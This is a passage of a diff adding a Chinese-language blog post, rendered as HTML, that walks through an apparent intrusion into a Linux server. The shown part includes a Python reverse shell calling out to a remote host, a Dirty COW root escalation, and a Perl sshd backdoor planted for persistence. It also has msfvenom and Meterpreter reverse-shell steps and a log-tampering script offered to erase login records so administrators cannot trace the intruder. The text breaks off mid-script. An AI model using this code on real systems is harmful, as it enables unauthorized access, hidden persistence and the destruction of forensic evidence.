+        <span class="n">unsetenv</span><span class="p">(</span><span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">);</span>
+        <span class="n">system</span><span class="p">(</span><span class="n">cmdline</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><code>gcc -shared -fPIC bypass.c -o byapss.so</code> 编译了一下去利用，发现可以哦！</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/11.png" alt=""></p>
+<h1 id="0x06-脏牛提权">0x06 脏牛提权</h1>
+<p>可以执行命令了，执行上反弹shell，有交互的shell舒服多了，这里用python的反弹脚本，一般系统有装python脚本，我都会先用pyhton，因为有一些系统的不一样，bash或者nc比较麻烦。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">os</span>
+<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&#34;x.x.x.x&#34;</span><span class="p">,</span><span class="mi">7777</span><span class="p">))</span>
+<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span><span class="s2">&#34;-i&#34;</span><span class="p">]);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>监听一波
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/12.png" alt="">
+反弹成功了
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/13.png" alt=""></p>
+<p>执行<code>uname -a</code>看了下版本</p>
+<p>Linux cloud 2.6.32-642.el6.x86_64 #1 SMP Tue May 10 17:27:01 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</p>
+<p>2.6的版本上脏牛必中，可以不用在目标机子上面编译，在自己的Linux环境编译然后上传到目标机子上面执行
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/14.png" alt=""></p>
+<p>那就静静等待脏牛把root替换掉，然后脸上目标机子，大概要几分钟这样子，去连ssh的时候有些管理员会把ssh的端口改了，用命令<code>netstat -nlp</code>就可以看到了。</p>
+<p>已经成功了，用户名为<code>firefart</code>密码是刚设置的123456。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/15.png" alt=""></p>
+<p>已经成功登陆目标机子
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/16.png" alt=""></p>
+<h1 id="0x07-持续访问-ssh后门">0x07 持续访问-ssh后门</h1>
+<p>登陆目标机子后，记得及时恢复/etc/passwd</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">cp /tmp/passwd.bak /etc/passwd
+</code></pre></td></tr></table>
+</div>
+</div><p>看过一篇文章，觉得这个后门也不错，https://www.freebuf.com/articles/system/140880.html</p>
+<p>那些pam补丁、隐藏文件、suid、inetd等都可以用作后门，看你环境。</p>
+<ol>
+<li>这个ssh 后门伪装成一个perl脚本，名为sshd，位于/usr/sbin/sshd , 将系统原先的sshd 移到/usr/bin下</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/perl</span>
+<span class="n">exec</span><span class="s2">&#34;/bin/sh&#34;</span><span class="k">if</span><span class="p">(</span><span class="n">getpeername</span><span class="p">(</span><span class="n">STDIN</span><span class="p">)</span><span class="o">=~/^..</span><span class="n">zf</span><span class="o">/</span><span class="p">);</span>
+<span class="n">exec</span><span class="p">{</span><span class="s2">&#34;/usr/bin/sshd&#34;</span><span class="p">}</span><span class="s2">&#34;/usr/sbin/sshd&#34;</span><span class="p">,</span><span class="nd">@ARGV</span><span class="p">;</span>
+</code></pre></td></tr></table>
+</div>
+</div><ol start="2">
+<li>将真正的sshd 移至/usr/bin/sshd</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">mv /usr/sbin/sshd /usr/bin/sshd
+</code></pre></td></tr></table>
+</div>
+</div><ol start="3">
+<li>将后门sshd (perl脚本移动至/usr/sbin/sshd),并授予执行权限</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">chmod +x /usr/sbin/sshd 
+</code></pre></td></tr></table>
+</div>
+</div><ol start="4">
+<li>重启 ssh 服务</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">/etc/init.d/sshd restart
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/17.png" alt="">
+5.连接后门，记得安装好socat</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">sudo yum install socat
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">#socat STDIO TCP4:目标ip:ssh端口一般是22,sourceport=31334
+socat STDIO TCP4:127.0.0.1:22,sourceport=31334
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/18.png" alt=""></p>
+<h1 id="0x08-metaspliot-横向渗透">0x08 metaspliot 横向渗透</h1>
+<p>当然做内网渗透必不可少的就是msf了，如果是Windows的话推荐使用<code>CobaltStrike</code>非常nice的一个工具。</p>
+<p>反正我们现在拿到root的shell了，先反弹一个Meterpreter的会话，还是常规的生成payload，然后监听等待上线</p>
+<ol>
+<li>先生成一个后门</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.79.132 LPORT=4455 -f elf &gt; shell.elf
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/19.png" alt="">
+2. 把shell.elf上传到目标机子上面运行
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/20.png" alt=""></p>
+<ol start="3">
+<li>在本地执行监听</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">use exploit/multi/handler
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4455
+exploit
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/21.png" alt=""></p>
+<ol start="4">
+<li>执行后门反弹Meterpreter的会话</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">chmod +x ./shell.elf
+./shell.elf
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/22.png" alt="">
+5.查看跳板机处于哪几个网段</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">run get_local_subnets
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/23.png" alt=""></p>
+<p>看了一下。。。</p>
+<p>但是我这个是属于外网的机子，后来想了一下感觉都不是内网一点意思都没有。。。</p>
+<p>算了吧下次有遇到内网的可以再写一篇内网渗透的文章出来哈</p>
+<h1 id="0x09-擦屁股">0x09 擦屁股</h1>
+<p>走之后记得清理痕迹，以防被溯源或者被管理员发现了。下面附上一个脚本供大家使用：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python </span>
+<span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">pwd</span> <span class="kn">import</span> <span class="n">getpwnam</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">strptime</span><span class="p">,</span> <span class="n">mktime</span>
+<span class="kn">from</span> <span class="nn">optparse</span> <span class="kn">import</span> <span class="n">OptionParser</span>
+
+<span class="n">UTMPFILE</span> <span class="o">=</span> <span class="s2">&#34;/var/run/utmp&#34;</span>
+<span class="n">WTMPFILE</span> <span class="o">=</span> <span class="s2">&#34;/var/log/wtmp&#34;</span>
+<span class="n">LASTLOGFILE</span> <span class="o">=</span> <span class="s2">&#34;/var/log/lastlog&#34;</span>
+
+<span class="n">LAST_STRUCT</span> <span class="o">=</span> <span class="s1">&#39;I32s256s&#39;</span>
+<span class="n">LAST_STRUCT_SIZE</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">calcsize</span><span class="p">(</span><span class="n">LAST_STRUCT</span><span class="p">)</span>
+
+<span class="n">XTMP_STRUCT</span> <span class="o">=</span> <span class="s1">&#39;hi32s4s32s256shhiii4i20x&#39;</span>
+<span class="n">XTMP_STRUCT_SIZE</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">calcsize</span><span class="p">(</span><span class="n">XTMP_STRUCT</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">getXtmp</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">hostname</span><span class="p">):</span>
+    <span class="n">xtmp</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span>
+        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+            <span class="nb">bytes</span> <span class="o">=</span> <span class="n">fp</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">XTMP_STRUCT_SIZE</span><span class="p">)</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="nb">bytes</span><span class="p">:</span>
+                <span class="k">break</span>
+
+            <span class="n">data</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="n">XTMP_STRUCT</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">)</span>
+            <span class="n">record</span> <span class="o">=</span> <span class="p">[(</span><span class="k">lambda</span> <span class="n">s</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">])(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">data</span><span class="p">]</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">record</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="n">username</span> <span class="ow">and</span> <span class="n">record</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">==</span> <span class="n">hostname</span><span class="p">):</span>
+                <span class="k">continue</span>
+            <span class="n">xtmp</span> <span class="o">+=</span> <span class="nb">bytes</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;Cannot open file: </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">filename</span><span class="p">)</span>
+    <span class="k">finally</span><span class="p">:</span>
+        <span class="n">fp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">xtmp</span>
+
+
+<span class="k">def</span> <span class="nf">modifyLast</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">hostname</span><span class="p">,</span> <span class="n">ttyname</span><span class="p">,</span> <span class="n">strtime</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">getpwnam</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;No such user.&#39;</span><span class="p">)</span>
+
+    <span class="n">timestamp</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">str2time</span> <span class="o">=</span> <span class="n">strptime</span><span class="p">(</span><span class="n">strtime</span><span class="p">,</span> <span class="s1">&#39;%Y:%m:</span><span class="si">%d</span><span class="s1">:%H:%M:%S&#39;</span><span class="p">)</span>
+        <span class="n">timestamp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">mktime</span><span class="p">(</span><span class="n">str2time</span><span class="p">))</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;Time format err.&#39;</span><span class="p">)</span>
+
+    <span class="n">data</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="n">LAST_STRUCT</span><span class="p">,</span> <span class="n">timestamp</span><span class="p">,</span> <span class="n">ttyname</span><span class="p">,</span> <span class="n">hostname</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span>
+        <span class="n">fp</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="n">LAST_STRUCT_SIZE</span> <span class="o">*</span> <span class="n">p</span><span class="o">.</span><span class="n">pw_uid</span><span class="p">)</span>
+        <span class="n">fp</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;Cannot open file: </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">filename</span><span class="p">)</span>
+    <span class="k">finally</span><span class="p">:</span>
+        <span class="n">fp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="k">return</span> <span class="kc">True</span>
+
+
+<span class="k">def</span> <span class="nf">showMessage</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
+    <span class="nb">print</span> <span class="n">msg</span>
+    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">saveFile</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">contents</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;w+b&#39;</span><span class="p">)</span>
+        <span class="n">fp</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">contents</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">IOError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="n">showMessage</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+    <span class="k">finally</span><span class="p">:</span>
+        <span class="n">fp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">usage</span> <span class="o">=</span> <span class="s1">&#39;usage: logtamper.py -m 2 -u b4dboy -i 192.168.0.188</span><span class="se">\n</span><span class="s1"> </span><span class="se">\
+</span><span class="se"></span><span class="s1">        logtamper.py -m 3 -u b4dboy -i 192.168.0.188 -t tty1 -d 2015:05:28:10:11:12&#39;</span>
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">OptionParser</span><span class="p">(</span><span class="n">usage</span><span class="o">=</span><span class="n">usage</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s1">&#39;-m&#39;</span><span class="p">,</span> <span class="s1">&#39;--mode&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;MODE&#39;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s1">&#39;1&#39;</span> <span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;1: utmp, 2: wtmp, 3: lastlog [default: 1]&#39;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s1">&#39;-t&#39;</span><span class="p">,</span> <span class="s1">&#39;--ttyname&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;TTYNAME&#39;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s1">&#39;-f&#39;</span><span class="p">,</span> <span class="s1">&#39;--filename&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;FILENAME&#39;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s1">&#39;-u&#39;</span><span class="p">,</span> <span class="s1">&#39;--username&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;USERNAME&#39;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s1">&#39;-i&#39;</span><span class="p">,</span> <span class="s1">&#39;--hostname&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;HOSTNAME&#39;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s1">&#39;-d&#39;</span><span class="p">,</span> <span class="s1">&#39;--dateline&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;DATELINE&#39;</span><span class="p">)</span>
+    <span class="p">(</span><span class="n">options</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">args</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">MODE</span> <span class="o">==</span> <span class="s1">&#39;1&#39;</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">USERNAME</span> <span class="o">==</span> <span class="kc">None</span> <span class="ow">or</span> <span class="n">options</span><span class="o">.</span><span class="n">HOSTNAME</span> <span class="o">==</span> <span class="kc">None</span><span class="p">:</span>
+                <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;+[Warning]: Incorrect parameter.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+
+            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">==</span> <span class="kc">None</span><span class="p">:</span>
+                <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">=</span> <span class="n">UTMPFILE</span>
+
+            <span class="c1"># tamper</span>
+            <span class="n">newData</span> <span class="o">=</span> <span class="n">getXtmp</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span><span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">USERNAME</span><span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">HOSTNAME</span><span class="p">)</span>
+            <span class="n">saveFile</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span><span class="p">,</span> <span class="n">newData</span><span class="p">)</span>
+
+        <span class="k">elif</span> <span class="n">options</span><span class="o">.</span><span class="n">MODE</span> <span class="o">==</span> <span class="s1">&#39;2&#39;</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">USERNAME</span> <span class="o">==</span> <span class="kc">None</span> <span class="ow">or</span> <span class="n">options</span><span class="o">.</span><span class="n">HOSTNAME</span> <span class="o">==</span> <span class="kc">None</span><span class="p">:</span>
+                <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;+[Warning]: Incorrect parameter.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+
+            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">==</span> <span class="kc">None</span><span class="p">:</span>
+                <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">=</span> <span class="n">WTMPFILE</span>
+
+            <span class="c1"># tamper</span>
+            <span class="n">newData</span> <span class="o">=</span> <span class="n">getXtmp</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span><span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">USERNAME</span><span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">HOSTNAME</span><span class="p">)</span>
+            <span class="n">saveFile</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span><span class="p">,</span> <span class="n">newData</span><span class="p">)</span>
+
+        <span class="k">elif</span> <span class="n">options</span><span class="o">.</span><span class="n">MODE</span> <span class="o">==</span> <span class="s1">&#39;3&#39;</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">USERNAME</span> <span class="o">==</span> <span class="kc">None</span> <span class="ow">or</span> <span class="n">options</span><span class="o">.</span><span class="n">HOSTNAME</span> <span class="o">==</span> <span class="kc">None</span> <span class="ow">or</span> <span class="n">options</span><span class="o">.</span><span class="n">TTYNAME</span> <span class="o">==</span> <span class="kc">None</span> <span class="ow">or</span> <span class="n">options</span><span class="o">.</span><span class="n">DATELINE</span> <span class="o">==</span> <span class="kc">None</span><span class="p">:</span>
+                <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;+[Warning]: Incorrect parameter.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+
+            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">==</span> <span class="kc">None</span><span class="p">:</span>
+                <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">=</span> <span class="n">LASTLOGFILE</span>
+
+            <span class="c1"># tamper</span>
